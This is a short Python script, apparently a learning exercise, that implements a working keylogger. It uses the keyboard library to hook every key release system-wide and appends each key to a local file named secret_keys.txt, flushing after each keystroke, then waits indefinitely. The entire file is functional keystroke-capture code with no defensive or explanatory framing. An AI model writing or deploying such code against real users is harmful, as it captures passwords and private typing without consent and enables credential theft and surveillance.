import keyboard

our_file = open(r"C:\8200\python_files\secret_keys.txt", "w")

def new_Key(Event):
    button = Event.name

    if(button == "space"):
        our_file.write(" ")

    else:
        our_file.write(button)

    our_file.flush()


keyboard.on_release(callback=new_Key)
keyboard.wait()